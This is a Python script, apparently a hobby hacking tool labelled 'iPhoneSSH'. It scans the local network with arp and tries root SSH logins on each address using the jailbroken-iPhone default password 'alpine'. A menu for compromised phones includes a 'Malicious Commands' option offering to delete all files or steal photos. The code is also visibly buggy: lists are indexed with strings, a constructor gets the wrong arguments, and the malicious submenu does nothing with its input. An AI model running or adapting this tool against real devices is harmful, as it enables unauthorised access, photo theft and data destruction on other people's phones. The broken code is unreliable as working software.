import paramiko
import subprocess
import re
import socket
import time
from paramiko.ssh_exception import SSHException
from iPhone import iPhone

client = paramiko.SSHClient()
arpScanResult = str(subprocess.run(['arp', '-a'], stdout=subprocess.PIPE))
ipList = re.findall(re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'), arpScanResult)
iPhoneList = []


def countdown(t):
    print("Starting Port Scan In:")
    while t:
        mins, secs = divmod(t, 60)
        timeformat = '{:02d}:{:02d}'.format(mins, secs)
        print(timeformat, end='\n')
        time.sleep(1)
        t -= 1


def looper(pw):
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for i in ipList:
        print("Connecting to " + i)
        try:
            client.connect(i, username="root", password=pw, timeout=5)
            iPhoneList.append(iPhone(ipList[i] ,pw))
        except paramiko.AuthenticationException:
            print("We had an authentication exception!")
            shell = None
        except socket.timeout:
            print("socket timeout")
        except (SSHException, OSError) as error:
            print("error")


def main():
    print("""

 /$$$$$$           /$$                                      /$$$$$$   /$$$$$$  /$$   /$$
|_  $$_/          | $$                                     /$$__  $$ /$$__  $$| $$  | $$
  | $$    /$$$$$$ | $$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ | $$  \__/| $$  \__/| $$  | $$
  | $$   /$$__  $$| $$__  $$ /$$__  $$| $$__  $$ /$$__  $$|  $$$$$$ |  $$$$$$ | $$$$$$$$
  | $$  | $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$$$$$ \____  $$ \____  $$| $$__  $$
  | $$  | $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$_____/ /$$  \ $$ /$$  \ $$| $$  | $$
 /$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$
|______/| $$____/ |__/  |__/ \______/ |__/  |__/ \_______/ \______/  \______/ |__/  |__/
        | $$                                                                            
        | $$                                                                            
        |__/                                                                            

""")
    # countdown(5)
    inp = input("1) Would you like to find vulnerable iPhones with default passwords, or 2) Access Your Phone with a custom password? \n Input 1 or 2: ")
    if inp == '1':
        looper("alpine")
        if not iPhoneList:
            print("Sorry No Vulnerable iPhones Found! Exiting.")
            return
        choice = iPhone(iPhoneList[input("Choose an iPhone: ")])
    else:
        password = input("\n Enter Password: ")
        bruh = input("1) ipScan or 2 ) Manually input ip \n Enter 1 or 2:")
        if bruh == '1' :
            looper(password)
            choice = iPhone(iPhoneList[input("Choose an iPhone: ")])
            if not iPhoneList :
                print("Sorry your phone was not found! Exiting.")
                return
        else:
            ip = input("Enter Your ip : ")
            choice = iPhone(ip,password)


    x = '0'
    while x != '7':
        x = input("\n\nChose Something To Do! \n 1)Change iPhones \n 2) Restart SpringBoard \n 3) Restart IPhone \n 4) Install a Tweak \n 5) Play A Saved Song! \n 6) Malicious Commands \n 7) Quit \n  Enter Here : ")
        if x == '1':
            choice = iPhone(iPhoneList[input("Choose an iPhone: ")])
        elif x == '2':
            choice.restartSpringBoard()
        elif x == '3':
            choice.restartiPhone()
        elif x == '4':
            choice.installTweak()
        elif x == '5':
            choice.playSong()
        elif x == '6':
            c = input("\n\n Chose Something Malicious To Do! \n 1) Delete All Files (this will break your phone) \n 2) Steal Photos \n 3) Main Menu \n Enter Here : ")

if __name__ == "__main__":
    main()
    print('Goodbye!\n\n')
